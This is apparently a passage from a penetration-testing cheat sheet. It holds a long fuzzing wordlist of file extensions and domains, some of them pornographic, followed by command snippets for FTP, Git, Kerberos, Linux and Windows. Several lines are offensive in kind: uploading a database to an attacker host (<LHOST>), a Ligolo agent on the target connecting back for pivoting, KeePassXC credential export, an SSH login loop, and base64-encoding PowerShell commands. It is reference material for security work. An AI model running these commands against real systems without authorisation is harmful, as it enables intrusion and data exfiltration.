.email.shtml
.en.htm
.engine
.env
.error-log
.esp
.ex
.exc
.exe,
.ext
.external
.ficheros
.fichiers
.flush
.fmt
.fn
.footer
.form_jhtml
.friend
.g.
.geo.xml
.ghtml
.google.com
.gov
.gpg
.hl
.href
.htm.d
.htm.html
.htm.old
.htm2
.html.orig
.html.sav
.html[
.html]
.html_
.html_files
.htmlpar
.htmlprint
.html}
.htm~
.hts
.hu
.hwp
.ibf
.il
.image.php
.imagecreatetruecolor
.imagejpeg
.iml
.imprimer
.imprimer-cadre
.imprimir
.imprimir-marco
.info.html
.info.php
.ini.bak
.ini.default
.inl
.inv
.join
.jpg.jpg
.jps
.key
.kit
.lang
.lignee
.ltr
.lzh
.m4a
.mail
.manager
.md5
.met
.metadesc
.metakeys
.mht
.min
.mld
.mobi
.mobile
.mv4
.n
.net-tov.html
.nfo
.nikon
.nodos
.nxg
.obyx
.ods
.old.2
.old.asp
.old.html
.open
.opml.config
.ord
.org.zip
.ori
.partfinder
.pho
.php-
.phpl
.phpx
.pix
.pls
.prc
.pre
.prhtm
.print-frame
.print.
.print.shtml
.printer
.properties
.propfinder
.pvx
.p​hp
.recherche
.redirect
.req
.roshani-gunewardene.net
.roshani-m-gunewardene.com
.safe
.sbk
.se.php
.search.asp
.sec
.seo
.serv
.server.php
.servlet
.settings
.sf
.shopping_return.php
.shopping_return_adsense.php
.show
.sht
.skins
.so
.sph
.split
.sso
.stats.php
.story
.swd
.swf.html
.sys
.tex
.tga
.thm
.tlp
.tml
.tmp.php
.touch
.tsv
.txt.
.txt.html
.ug
.unternehmen
.utf8
.vbproj.vspscc
.vsprintf
.vstemplate
.vtl
.wbmp
.webc
.webproj
.wihtm
.wp
.wps
.wri
.wsc
.www
.xsp
.xsql
.zip,
.zml
.ztml
. EXTRAHOTELERO HOSPEDAJE
. T.
. php
.,
.-0.html
.-bouncing
.-safety-fear
.0--DUP.htm
.0-0-0.html
.0-2.html
.0-4.html
.0-features-print.htm
.0-pl1
.0-to-1.2.php
.0.0.0
.0.1.1
.0.10.html
.0.11-pr1
.0.15
.0.35
.0.8.html
.0.jpg
.00.html
.001.L.jpg
.002.L.jpg
.003.L.jpg
.003.jpg
.004.L.jpg
.004.jpg
.006
.006.L.jpg
.01-10
.01-L.jpg
.01.html
.01.jpg
.011
.017
.02.html
.03.html
.04.html
.041
.05.09
.05.html
.052
.06.html
.062007
.070425
.08-2009
.08.2010.php
.08.html
.09.html
.0b
.1-en
.1-english
.1-rc1
.1.0.html
.1.10
.1.2.1
.1.24-print.htm
.1.9498
.1.php
.1.x
.10.1
.10.11
.10.2010
.10.5
.100.html
.1008
.105
.1052
.10a
.11-pr1
.11.5-all-languages-utf-8-only
.11.6-all-languages
.110607
.1132
.12.pdf
.125.html
.1274
.12D6
.12EA
.133
.139
.13BA
.13F8
.14.05
.14.html
.1478
.150.html
.1514
.15462.articlePk
.15467.articlePk
.15F4
.160
.161E
.16BE
.1726
.175
.17CC
.18.html
.180
.1808
.1810
.1832
.185
.18A
.19.html
.191E
.1958
.1994
.199C
.1ADE
.1C2E
.1C50
.1CD6
.1D8C
.1E0
.1_stable
.2-english
.2.0.html
.2.00
.2.2.html
.2.2.pack.js
.2.6.min.js
.2.6.pack.js
.2.7
.2.php
.2.swf
.2.tmp
.2.zip
.200.html
.2004.html
.2005
.2009.pdf
.202
.205.html
.20A6
.22.html
.220
.24.html
.246.224.125
.24stable
.25.04
.25CE
.2769
.28.html
.2808
.29
.2ABE
.2B26
.2CC
.2CD0
.2D1A
.2DE
.2E4
.2E98
.2EE2
.2b
.3-pl1
.3-rc1
.3.2a
.3.6
.3.7-english
.3.asp
.3.php
.30.html
.308E
.31.html
.330
.3374
.33E0
.346A
.347A
.347C
.3500
.3590
.35B8
.36
.37
.37.0.html
.37C2
.3850
.3EA
.3F54
.4-all-languages
.4.10a
.4.14
.4.3
.4.5
.40.html
.4040
.414
.41A2
.4234
.42BA
.43
.43CA
.43FA
.4522
.4556
.464
.46A2
.46D4
.47F6
.482623
.4884
.490
.497C
.4A4
.4A84
.4B88
.4C6
.4CC
.4D3C
.4D6C
.4FB8
.5-all-languages-utf-8-only
.5-pl1
.5.1.html
.5.5-pl1
.5.i
.50.html
.508
.50A
.51
.5214
.55.html
.574
.576
.5B0
.5E0
.5E5E
.5_mod_for_host
.6.0-pl1
.6.3-pl1
.6.3-rc1
.6.4
.608
.61.html
.63
.65.html
.65E
.67E
.698
.69A
.6A0
.6CE
.6D2
.6D6
.6DA
.6EE
.6F8
.6FA
.6FC
.7-2.html
.7-english
.7.2.custom
.7.5
.7.js
.710
.71E
.71a
.732
.73C
.776
.77C
.7878
.78A
.792
.79C
.7AB6
.7AE
.7AF8
.7B0
.7B30
.7B5E
.7C6
.7C8
.7CA
.7CC
.7D6
.7E6
.7F0
.7F4
.7FA
.7FE
.7_0_A
.8.0
.8.0.html
.8.23
.8.4
.8.html
.802
.80A
.80E
.824
.830
.832
.836
.84
.84.119.131
.842
.84CA
.84E
.854
.856
.858
.860
.862
.866
.878
.87C
.888luck.asia
.88C
.8990
.89E
.8AE
.8B0
.8C6
.8D68
.8DC
.8E6
.8EC
.8EE
.8a
.9.2
.9.6.2
.9.html
.90.3
.90.html
.918
.924
.94
.9498
.95
.95.html
.964
.97C
.984
.99
.99E
.9A6
.9C
.9CEE
.9D2
.A.
.A00
.A02
.A22
.A34
.A40
.A4A
.A50
.A58
.A5CA
.A8A
.AB60
.AC0
.AC2
.ACA2
.AE2
.AEFA
.AF54
.AF90
.ALT
.ASC.
.Acquisition
.Appraisal
.B04
.B18
.B1C
.B2C
.B38
.B50
.B5E
.B70
.B7A
.B8A
.BBC
.BD0
.BMP
.C.R.D.
.C38
.C44
.C50
.C68
.C72
.C78
.C7C
.C84
.CAA
.CAB
.CB8
.CBC
.CC0
.CF4
.CF6
.CGI
.Cfm
.Commerce
.CorelProject
.Css
.D.
.D.R.
.D20
.D7A
.DBF
.DC2
.DESC.
.DLL
.DOCX
.Direct
.DnnWebService
.Doc
.E46
.E96
.EA0
.EBA
.EC0
.EDE
.EEA
.EF8
.Email
.Eus
.F22
.F46
.F54
.FAE
.FRK
.H.I.
.INFO
.INI
.ISO
.Includes
.K.E.
.K.T.
.KB
.L.
.L.jpg
.LassoApp
.MLD
.Main
.NET
.NEWCONFIGPOSSIBLYBROKEN
.Old
.Org.master
.Org.master.cs
.Org.sln
.Org.vssscc
.P.
.PSD
.Publish
.RAW
.S
.SideMenu
.Sol.BBCRedirection.page
.Superindian.com
.T.A
.T.A.
.TEST
.Tung.php
.WTC
.XMLHTTP
.Xml
._._order
._heder.yes.html
._order
.a.html
.a5w
.aac
.access
.act.php
.action.php
.actions
.activate.php
.ad.php
.add.php
.adenaw.com
.adm
.advsearch
.ag.php
.aj_
.all.hawaii
.amaphun.com
.andriy.lviv.ua
.ap
.api
.apk
.application
.archiv
.arj
.array-map
.array-values
.art
.artdeco
.articlePk
.artnet.
.ascx.resx
.asia
.asp-
.asp.LCK
.asp.html
.asp2
.aspDONOTUSE
.asp_
.asp_files
.aspl
.aspp
.asps
.aspx.designer.cs
.aspx_files
.aspxx
.aspy
.asxp
.as​p
.at.html
.avatar.php
.awstats
.a​sp
.babymhiasexy.com
.backup.php
.bak.php
.banan.se
.banner.php
.barnes
.basicmap.php
.baut
.bc
.best-vpn.com
.beta
.biz
.blackandmature.com
.bmp.php
.board.asd
.boom
.bossspy.org
.buscadorpornoxxx.com
.buy-here.com
.buyadspace
.bycategory
.bylocation
.bz
.c.html
.cache.inc.php
.cache.php
.car
.cascinaamalia.it
.cat.php
.catalog
.cdf
.ce
.cfm.bak
.cfsifatest.co.uk
.cfstest.co.uk
.cfswf
.cfx
.cgis
.chat
.chdir
.chloesworld.com
.classes.php
.cmp
.cnt
.co
.co-operativebank.co.uk
.co-operativebanktest.co.uk
.co-operativeinsurance.co.uk
.co-operativeinsurancetest.co.uk
.co-operativeinvestmentstest.co.uk
.co.il
.colorbox-min.js
.com-authorization-required.html
.com-bad-request.html
.com-forbidden.html
.com-internal-server-error.html
.com-page-not-found.html
.com.au
.com.php
.com.ua
.com_Backup_
.com_files
.comments
.comments.
.comments.php
.compiler.php
.conf.html
.confirm.email
.connect.php
.console
.contact
.content.php
.controller
.controls-3.1.5.swf
.cookie.js
.corp
.corp.footer
.cqs
.cron
.cropcanvas.php
.cropinterface.php
.crx
.csproj.webinfo
.csr
.css.LCK
.css.gz
.cssd
.csv.php
.ctp
.cx
.cycle.all.min.js
.d64
.daisy
.dal
.daniel
.daniel-sebald.de
.data.php
.data_
.davis
.dbml
.dcf
.de.jsp
.default.php
.del
.deleted
.dell
.demo
.desarrollo.aquihaydominios.com
.dev.bka.co.nz
.development
.dig
.display.php
.dist
.dk
.dm
.dmca-sucks.com
.dms
.dnn
.dogpl
.donothiredandobrin.com
.dontcopy
.downloadfreeporn.asia
.du
.dump
.dws
.dyn
.ea3ny.com
.easing.min.js
.ebay
.ebay.results.html
.editingoffice.com
.efacil.com.br
.ehtml
.emaximinternational.com
.en.jsp
.enn
.equonix.com
.es.html
.es.jsp
.euforyou.net
.eur
.excel.xml.php
.exec
.exp
.f.l.
.faucetdepot
.faucetdepot.com.vbproj
.faucetdepot.com.vbproj.webinfo
.fb2
.fdml
.feeds.php
.ffa
.ficken.cx
.filereader
.filters.php
.flac
.flypage
.fon
.forget.pass
.form.php
.forms
.forum
.found
.fp7
.fr.jsp
.freeasianporn.asia
.freepornxxx.asia
.frk
.frontpage.php
.ft
.ftl
.fucks.nl
.funzz.fr
.gallery.php
.garcia
.gb
.get
.get-meta-tags
.gif         
.gif.count
.girlvandiesuburbs.co.za
.gitihost.com
.glasner.ru
.google
.gray
.gsp
.guiaweb.tk
.gutschein
.guy
.ha
.hardestlist.com
.hardpussy.com
.hasrett.de
.hawaii
.header.php
.henry
.him
.history
.hlr
.hm
.ho
.hokkaido
.hold
.home.php
.home.test
.homepage
.hp
.htm.bak
.htm.rc
.htm3
.htm5
.htm7
.htm8
.htm_
.html,,
.html-0
.html-1
.html-c
.html-old
.html-p
.html.htm
.html.images
.html.inc
.html.none
.html.pdf
.html.start
.html.txt
.html4
.html5
.html7
.htmlBAK
.htmlDolmetschen
.html_old
.htmla
.htmlc
.htmlfeed
.htmlq
.htmlu
.htn
.htpasswd
.h​tml
.iac.
.ibuysss.info
.iconv
.idf
.iframe_filtros
.ignore.php
.ihmtl
.ihya
.imp
.in
.inactive
.inc.php.bak
.inc.php3
.incest-porn.sex-startje.nl
.incestporn.sex-startje.nl
.incl
.indiansexzite.com
.indt
.ini.NEWCONFIGPOSSIBLYBROKEN
.insert
.internet-taxprep.com
.interpreterukraine.com
.ipl
.issues
.itml
.ixi
.jhtm
.job
.joseph
.jpf
.jpg.xml
.jpg[
.jpg]
.js,
.js.LCK
.jsa
.jsd
.jso
.jsp.old
.jsps
.jtp
.keyword
.kinkywear.net
.kk
.knvbcommunicator.voetbalassist.nl
.kokuken
.ks
.kutxa.net-en
.lang-de.php
.lang.php
.langhampartners.com
.lappgroup.com
.last
.latest
.lha
.links
.list.includes
.listMiniGrid
.listing
.lng
.loc
.local.cfm
.location.href
.log2
.lua
.lynkx
.maastrichtairporthotels.com
.mag
.mail.php
.malesextoys.us
.massivewankers.com
.mbizgroup
.mel
.members
.meretrizdelujo.com
.messagey.com
.metadata.js
.meus.php
.midi
.milliculture.net
.min_
.miss-video.com
.mk.gutschein
.mk.rabattlp
.mkv
.mmap
.model-escorts.asia
.modelescorts.asia
.mp
.mp3.html
.mq4
.mreply.rc
.msp
.mvn
.mysqli
.napravlenie_ASC
.napravlenie_DESC
.nded-pga-emial
.net-en
.net-print.htm
.net_Backup_Giornaliero
.net_Backup_Settimanale
.new.htm
.newsletter
.nexucom.com
.ninwinter.net
.nl.html
.nonude.org
.nonudes.com
.nth
.nz
.od
.offer.php
.offline
.ogv
.ok
.old.1
.old.htm
.old.old
.old1
.old3
.older
.oliver
.onedigitalcentral.com
.onenettv.com
.online
.opensearch
.org-tov.html
.org.ua-tov.html
.orig.html
.origin.php
.original.html
.orlando-vacationhome.net
.orlando-vacationhomes-pools.com
.orlando-vacationrentals.net
.osg
.outbound
.owen
.ownhometest.co.uk
.pae
.page_pls_all_password
.pages-medicales.com
.pan
.parse-url
.part
.pass
.patch
.paul
.paymethods.php
.pazderski.com
.pazderski.net
.pazderski.us
.pdd
.pdf.html
.pdf.pdf
.pdf.php
.pdfx
.perfect-color-world.com
.petersburg-apartments-for-business.html
.petersburg-apartments-for-tourists.html
.petersburg-romantic-apartments.html
.phdo
.photo
.php--------------
.php.LCK
.php.backup
.php.html
.php.inc
.php.mno
.php.original
.php_
.php_OLD
.php_old
.phphp
.phppar
.phpvreor.php
.php
.pht
.pl.html
.planetcom.ca
.playwithparis.com
.plugins
.png,bmp
.popup
.pornfailures.com
.pornoizlee.tk
.pornz.tv
.posting.prep
.prev
.print.jsp
.prl
.prosdo.com
.psb
.publisher.php
.puresolo.com
.pussyjourney.com
.qtgp
.qxd
.r.
.rabattlp
.rails
.randomocityproductions.com
.rateart.php
.readfile
.rec.html
.redirect.php
.remove
.remove.php
.removed
.resultados
.resume
.rhtm
.riddlesintime.com
.rmvb
.ro
.roma
.roomscity.com
.roshanigunewardene.com
.rpt
.rsp
.rss.php
.rss_cars
.rss_homes
.rss_jobs
.rtfd
.rvt
.s.html
.sadopasion.com
.safariextz
.salestax.php
.sc
.sca-tork.com
.scandir
.scrollTo.js
.search.html
.sec.cfm
.section
.secure
.send
.sent-
.service
.session-regenerate-id
.set
.sex-startje.nl
.sexmeme.com
.sexon.com
.sexy-girls4abo.de
.sfw
.sgf
.shipcode.php
.shipdiscount.php
.show.php
.shtml.html
.sidebar
.sisx
.sitemap.
.skin
.small-penis-humiliation.net
.smiletest.co.uk
.snippet.aspx
.snuffx.com
.sort
.sortirovka_Price.napravlenie_ASC
.sortirovka_Price.napravlenie_DESC
.sortirovka_customers_rating.napravlenie_ASC
.sortirovka_customers_rating.napravlenie_DESC
.sortirovka_name.napravlenie_ASC
.sortirovka_name.napravlenie_DESC
.sp
.sphp3
.srch
.srf
.srvl
.st-patricks.com
.sta
.staged.php
.staging
.start.php
.stat
.stats
.step
.stml
.storebanner.php
.storelogo.php
.storename.php
.sts.php
.suarez
.submit
.support
.support.html
.swf.LCK
.sym
.system
.tab-
.table.html
.tablesorter.min.js
.tablesorter.pager.js
.tatianyc.com
.tb
.tech
.teen-shy.com
.teenhardpussy.com
.temp.php
.templates.php
.temporarily.withdrawn.html
.test.cgi
.test.php
.tf
.tg
.thanks
.thehotfish.com
.theme
.thompson
.thumb.jpg
.ticket.submit
.tim
.tk
.tls
.to
.touch.action
.trace
.tracker.ashx
.trade
.trishasex.viedos.com
.ts
.tst
.tvpi
.txt.txt
.txuri-urdin.com
.ufo
.ugmart.ug
.ui-1.5.2
.unixteacher.org
.unsharp.php
.update
.upgrade
.v1.11.js
.v2.php
.vacationhomes-pools.com
.var
.venetian.com,prod2.venetian.com,reservations.venetian.com,
.verify
.video
.videodeputas.com
.videos-chaudes.com
.viewpage__10
.vmdk
.vn
.voetbalassist.nl
.vs
.vx
.vxlpub
.w3m
.w3x
.wax
.web-teck.com
.webalizer
.webarchive
.webjockey.nl
.webm
.weedooz.eu
.wgx
.wimzi.php
.wireless
.wireless.action
.wm
.woolovers.com
.working
.wpl
.wplus
.wps.rtf
.write.php
.wwsec_app_priv.login
.www.annuaire-vimarty.net
.www.annuaire-web.info
.www.kit-graphik.com
.www.photo-scope.fr
.xcam.at
.xconf
.xcwc.com
.xgi
.xhtml5
.xlt
.xm
.xml.old
.xpdf
.xqy
.xslx
.xst
.xsx
.xy.php
.yp
.ys
.z
.za
.zh.html
.zhtml
.zip.php
```

## find

```console
$ find . -type f
```

### Line Count

```console
$ find . -type f -exec wc -l {} \; | sort -nr
```

### Find not empty Files

```console
$ find results -not -empty -ls
```

### Show Permissions

```console
$ find . -type d -ls
```

## findmnt

```console
$ findmnt
```

## for loop

```console
$ for i in $(seq 0 30); do ssh -i ~/.ssh/id_rsa root@<RHOST>; sleep 1; done
```

### Generate simple List

```console
$ for i in `seq 1 100`; do echo $i; done
```

## FTP

```console
$ ftp <RHOST>
$ ftp -A <RHOST>
```

### Common Commands

```console
ftp> dir      // lsit all files and directories
ftp> ls -a    // list all files (even hidden) (yes, they could be hidden)
ftp> binary   // set transmission to binary instead of ascii
ftp> ascii    // set transmission to ascii instead of binary
ftp> bye      // exit
```

### Anonymous Login

```console
Username: anonymous
Password: anonymous
```

### Browser Connection

```console
ftp://anonymous:anonymous@<RHOST>
```

### Passive Mode

```console
$ ftp -p <RHOST>    // passive mode for firewall evasion
```

### Download all files from FTP

```console
$ wget -r ftp://anonymous:anonymous@<RHOST>
$ wget -m ftp://anonymous:anonymous@<RHOST>
$ wget -m --no-passive ftp://anonymous:anonymous@<RHOST>
```

### Scan for detailed Output

```console
$ nmap -sC -sV -p 21 -vvv <RHOST>
```

### Fixing 229 Entering Extended Passive Mode

```console
ftp> passive
```

## getent

```console
$ getent passwd
```

## getfacl

### Read ACL Permissions

```console
$ getfacl <DIRECTORY>
```

## gin

> https://github.com/sbp/gin

```console
$ ./gin /PATH/TO/REPOSITORY
```

## Git

### Common Commands

```console
$ git show-branch
$ git log <BRANCH> --oneline
$ git show <COMMIT>
```

### Clone Repository without SSL Verification

```console
$ GIT_SSL_NO_VERIFY=true git clone https://<RHOST>/PATH/TO/REPOSITORY/<REPOSITORY>.git
```

## Gitea

```console
$ git push http://<TOKEN>@<RHOST>:3000/<USERNAME>/<REPOSITORY>.git
```

## glab

```console
$ glab auth login
```

## Go

### How to update Go

> https://gist.github.com/nikhita/432436d570b89cab172dcf2894465753

> https://go.dev/doc/install#install

> https://go.dev/dl/

```console
$ sudo rm -rf /usr/local/go
$ sudo tar -C /usr/local -xzf /PATH/TO/FILE/go1.21.3.linux-amd64.tar.gz
$ echo $PATH | grep "/usr/local/go/bin"
```

### Environment Variables

```console
$ export PATH=$PATH:/usr/local/go/bin
$ export GO111MODULE=on
```

```console
$ export GOROOT=/usr/local/go
$ export GOPATH=$HOME/go
$ export PATH=$GOPATH/bin:$GOROOT/bin:$PATH
```

```console
$ export GOPATH=$HOME/go
$ export PATH="$HOME/go/bin:$PATH"
$ export PATH=$PATH:$GOROOT/bin:$GOPATH/bin
```

## goshs

### Common Commands

```console
$ goshs -i <LHOST> -p <LPORT> -d /PATH/TO/DIRECTORY/
$ goshs -i <LHOST> -p <LPORT> -d /PATH/TO/DIRECTORY/ -b <USERNAME>:<PASSWORD>
$ goshs -i <LHOST> -p <LPORT> -d /PATH/TO/DIRECTORY/ -si -b <USERNAME>:<PASSWORD>
```

### Copy File to the Server

```console
$ curl -F database=@./database.db -u <USERNAME>:<PASSWORD> http://<LHOST>/upload
```

## GPG

### Common Commands

```console
$ gpg -k
$ gpg -K
```

### Decryption

```console
$ gpg --use-agent --decrypt <FILE>.gpg > <FILE>
$ gpg --homedir /home/<USERNAME>/.gnupg --pinentry-mode=loopback --use-agent --decrypt <FILE>.gpg > <FILE>
```

## grep

```console
$ grep -rai '<FOOBAR>'           // also grep through binaries
$ grep -v                        // remove string from output
$ grep -Hnri <FILE> * | vim -    // pipe output into a new vim buffer
$ grep "$_" * | grep -v "_SERVER\|_SESSION"    // \| equals "or" in grep
```

```console
$ grep -oP '<UNWANTED>\K<OUTPUT-THIS>(?=UNWANTED)'
```

or

```console
$ grep -oP '".*php"'
```

#### Explanation

* -P matching Perl-compatible regular expressions (PCREs)
* -o only output the match, not entire line
* \K ignore everything on left from here
* (?=) ignore everything in here

#### Example

```console
echo 'aaaaabbbbbccccc' | grep -Po 'a+\Kb+(?=c+)'
bbbbb
```

### Search for IPv4 Addresses

```console
$ grep -oE "\b([0-9]{1,3}\.){3}[0-9]{1,3}\b"
```

### Extended Seach

```console
$ grep -oE "\b([0-9]{1,3}\.){3}[0-9]{1,3}\b|<search_parameter_2>"
```

### Enumerate JavaScript Files

```console
$ curl http://<DOMAIN>/js/chunk-vendors~03631906.67e21e66.js | grep -oP '/api/[^"]*'
```

## grpc

```console
$ pip install grpc
$ pip install grpc-tools
```

### Skeleton File Structure

```console
syntax = "proto3";

message Content {
        string data = 1;
}

message Data {
        string feed = 1;
}

service Print {
        rpc Feed(Content) return (Data) {}
}

$ python3 -m grpc_tools.protoc -I. --python_out=. --grpc_python_out=. file.proto
```

## host

```console
$ host <RHOST>
$ host <DOMAIN>
$ host -l <DOMAIN> <RHOST>
```

## icacls

```console
$ icacls <FILE>
```

## IMAP

```console
c1 LOGIN <USERNAME> <PASSWORD>
c2 LIST
```

## inotifywait

```console
$ inotifywait -m /PATH/TO/FOLDER/ -e create,modify,move
```

## IPython

> https://ipython.org/

```console
$ ipython3
```

## Java

### Compiling java.class

```console
$ javac <FILE>.java
$ javac -d . <FILE>.java
```

### Install Java 8

> https://www.java.com/de/download/manual.jsp

```console
$ sudo cp -R jre1.8.0_381 /usr/lib/jvm/
```

```console
$ cat /etc/environment
# START KALI-DEFAULTS CONFIG
# Everything from here and until STOP KALI-DEFAULTS CONFIG
# was installed by the kali-defaults package, and it will
# be removed if ever the kali-defaults package is removed.
# If you want to disable a line, please do NOT remove it,
# as it would be added back when kali-defaults is upgraded.
# Instead, comment the line out, and your change will be
# preserved across upgrades.
PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/local/games:/usr/games:/jvm/jdk1.8.0_321/bin:/usr/lib/jvm/jdk1.8.0_321/db/bin:/usr/lib/jvm/jdk1.8.0_321/jre/bin
COMMAND_NOT_FOUND_INSTALL_PROMPT=1
POWERSHELL_UPDATECHECK=Off
POWERSHELL_TELEMETRY_OPTOUT=1
DOTNET_CLI_TELEMETRY_OPTOUT=1
# STOP KALI-DEFAULTS CONFIG
```

```console
$ sudo update-alternatives --install "/usr/bin/java" "java" "/usr/lib/jvm/jre1.8.0_381/bin/java" 0
```

```console
$ sudo update-alternatives --install "/usr/bin/java" "java" "/usr/lib/jvm/jre1.8.0_381/bin/javac" 0
```

```console
$ sudo update-alternatives --set java /usr/lib/jvm/jre1.8.0_381/bin/java
```

```console
$ sudo update-alternatives --set java /usr/lib/jvm/jre1.8.0_381/bin/javac
```

```console
$ sudo update-alternatives --config java
```

## jq

### Formatting JSON Files

```console
for file in *.json; do jq . "$file" > "$file.tmp" && mv "$file.tmp" "$file"; done
```

## KeePassXC

### Username and Password Export

```console
$ keepassxc-cli export <FILE>.kdbx --format csv | awk -F',' '{print $3 ":" $4}' | sed 's/"//g'
```

## Kerberos

### Installation

```console
$ sudo apt-get install krb5-kdc
```

### General Information

```console
/etc/krb5.conf    // kerberos configuration file location
krb5.keytab       // "key table" file for one or more principals
.k5login          // resides kerberos principals for login (place in home directory)
```

### Common Commands

```console
$ kinit <USERNAME>                 // creating ticket request
$ klist                            // show available kerberos tickets
$ klist -e                         // list encryption types
$ klist -A                         // display all tickets in ticket cache
$ klist -k /etc/krb5.keytab        // lists keytab file
$ ksu                              // executes a command with kerberos authentication
$ add_principal <EMAIL>            // add a new user to a keytab file
$ kdestroy                         // delete cached kerberos tickets
$ kadmin                           // kerberos administration console
$ kadmin -p kadmin/<EMAIL> -k -t /etc/krb5.keytab    // enables editing of the keytab file
```

### Custom krb5.conf

```console
[libdefaults]
    default_realm = EXAMPLE.COM
    dns_lookup_realm = true
    dns_lookup_kdc = true
    ticket_lifetime = 24h
    forwardable = true

[realms]
    EXAMPLE.COM = {
        kdc = dc.example.com
        admin_server = dc.example.com
    }

[domain_realm]
    .example.com = EXAMPLE.COM
    example.com = EXAMPLE.COM
```

```console
$ export KRB5_CONFIG="krb5.config"
```

### Ticket Handling with krb5

#### Request Ticket with Impacket

```console
$ impacket-getTGT <DOMAIN>/<USERNAME>:'<PASSWORD>'
```

#### Ticket Export

```console
$ export KRB5CCNAME=<FILE>.ccache
$ export KRB5CCNAME='realpath <FILE>.ccache'
```

#### No KRB5CCAME Export Example

```console
$ KRB5CCNAME=<FILE>.ccache <APPLICATION>
```

### Debug

```console
KRB5_TRACE=/dev/stdout kinit -X X509_user_identity=FILE:admin.cer,admin.key Administrator@<DOMAIN>
```

### Fix Error Message: ldap3.core.exceptions.LDAPPackageUnavailableError: package gssapi (or winkerberos) missing

```console
$ sudo apt-get install heimdal-dev
```

## ldd

```console
$ ldd /bin/ls
```

## less

### Disable Line Wrapping

```console
$ | less -s
```

## lftp

### Common Commands

```console
$ lftp -u <USERNAME>,<PASSWORD> <RHOST>
lftp <USERNAME>@<RHOST>:~> user <USERNAME>
lftp <USERNAME>@<RHOST>:~> dir
lftp <USERNAME>@<RHOST>:~> get <FILE>
lftp <USERNAME>@<RHOST>:~> put <FILE>
```

### Force SSL Verification

```console
lftp <USERNAME>@<RHOST>:~> ftp:ssl-force true
```

### Disable SSL Verification

```console
lftp <USERNAME>@<RHOST>:~> set ssl:verify-certificate off
```

## Ligolo

> https://github.com/nicocha30/ligolo-ng

### Download Proxy and Agent

> https://github.com/nicocha30/ligolo-ng/releases

```console
$ wget https://github.com/nicocha30/ligolo-ng/releases/download/v0.6.2/ligolo-ng_agent_0.6.2_Linux_64bit.tar.gz
$ wget https://github.com/nicocha30/ligolo-ng/releases/download/v0.6.2/ligolo-ng_proxy_0.6.2_Linux_64bit.tar.gz
```

### Prepare Tunnel Interface

```console
$ sudo ip tuntap add user $(whoami) mode tun ligolo
```

```console
$ sudo ip link set ligolo up
```

### Setup Proxy on Attacker Machine

```console
$ ./proxy -laddr <LHOST>:443 -selfcert
```

### Setup Agent on Target Machine

```console
$ ./agent -connect <LHOST>:443 -ignore-cert
```

### Configure Session

```console
ligolo-ng » session
```

```console
[Agent : user@target] » ifconfig
```

```console
$ sudo ip r add 172.16.1.0/24 dev ligolo
```

```console
[Agent : user@target] » start
```

### Port Forwarding

```console
[Agent : user@target] » listener_add --addr 0.0.0.0:<LPORT> --to <LHOST>:80 --tcp 
[Agent : user@target] » listener_add --addr <RHOST>:<LPORT> --to <LHOST>:<LPORT> --tcp
```

## Linux

### User Management

#### Set Password

```console
$ passwd <USERNAME>
```

#### Rename a User

```console
$ usermod -l <NEW_USERNAME> -d /home/<NEW_USERNAME> -m <OLD_USERNAME>
$ groupmod -n <NEW_USERNAME> <OLD_USERNAME>
$ ln -s /home/<NEW_USERNAME> /home/<OLDUSERNAME>
```

##### Optional: Change Display Name

```console
$ chfn -f "GIVENNAME SURNAME" <NEW_USERNAME>
```

#### User Profile Files for Execution on Login

```console
.bashrc
.profile
.bash_profile
```

### Common Commands

```console
$ w
$ last -a
$ lsof -i
$ cat /etc/issue
$ cat /etc/*release*
$ cat /proc/version
$ sudo -l    // check sudo permissions
```

### Network Enumeration

```console
$ watch ss -tp
$ netstat -ant
$ netstat -tulpn
$ ss -tupn
$ ss -tulpn
$ ping -c 3 <RHOST>
```

### Processes

```console
$ ps -aux
$ ps -auxf
$ ps -eaf
$ ss -anp <PROCESS_ID>
$ cd /proc/<PROCESS_ID>
```

## Logfiles

### Webserver Access Logfile

```console
$ cd /var/log/apache2
$ grep <RHOST> access.log
```

## Logging

Add them to either the `.bashrc` or to the `.zshrc`.

### Bash: local IP address

```console
PS1="[`date  +"%Y-%m-%d %H:%M"`]\[\033[01;31m\] `ip a | grep -A 1 eth0 | grep inet | awk '{ print $2 }' | cut -d '/' -f 1`\[\033[00m\] \[\033[01;34m\]\w\[\033[00m\] \$ "
```

### Bash: external IP address

```console
PS1='[`date  +"%Y-%m-%d %H:%M"`]\[\033[01;31m\] `curl -s ifconfig.co`\[\033[00m\] \[\033[01;34m\]\w\[\033[00m\] \$ '
```

### ZSH: local IP address

```console
PS1="[20%D %T] %B%F{red}$(ip a | grep -A 1 eth0 | grep inet | awk '{ print $2 }' | cut -d '/' -f 1)%f%b %B%F{blue}%1~%f%b $ "
```

### ZSH: external IP address

```console
PS1="[20%D %T] %B%F{red}$(curl -s ifconfig.co)%f%b %B%F{blue}%1~%f%b $ "
```

### ZSH: Kali Prompt with local IP address

```console
PROMPT="%F{white,bold}%W %* $(ip a | grep -A 1 eth0 | grep inet | awk '{ print $2 }' | cut -d '/' -f 1)"$'%F{%(#.blue.green)}\n┌──${debian_chroot:+($debian_chroot)─}${VIRTUAL_ENV:+($(basename $VIRTUAL_ENV))─}(%B%F{%(#.red.blue)}%n'$prompt_symbol$'%m%b%F{%(#.blue.green)})-[%B%F{reset}%(6~.%-1~/…/%4~.%5~)%b%F{%(#.blue.green)}]\n└─%B%(#.%F{red}#.%F{blue}$)%b%F{reset} '
```

### PowerShell

For `PowerShell` paste it into the open terminal.

```console
$IPv4 = Test-Connection -ComputerName (hostname) -Count 1  | Select -ExpandProperty IPV4Address; function prompt{ "PS" + " [$(Get-Date)] $IPv4> $(get-location) " }
```

## Microsoft Windows

### Ping

```cmd
C:\> ping -n 1 <RHOST>
```

### Set Environment Variables

```cmd
C:\> sysdm.cpl
```

### Hide a File

```cmd
C:\> attrib +h <FILE>
```

### Command Format for PowerShell

```console
$ echo "<COMMAND>" | iconv -t UTF-16LE | base64 -w 0
$ echo "<COMMAND>" | iconv -f UTF-8 -t UTF-16LE | base64 -w0
$ iconv -f ASCII -t UTF-16LE <FILE>.txt | base64 | tr -d "\n"
```

### New Line

`Ctrl+v+m`

#### File Cleanup

```console
$ sed -i -e "s/^M//" <FILE>
```

### mklink

#### Create Symbolic Link

```cmd
C:\> mklink C:\PATH\TO\FILE\<FILE> C:\PATH\TO\FILE\<FILE>
C:\> mklink /D C:\PATH\TO\DIRECTORY C:\PATH\TO\DIRECTORY
```

#### Create Hard Link

```cmd
C:\> mklink C:\PATH\TO\FILE\<FILE> C:\PATH\TO\FILE\<FILE>
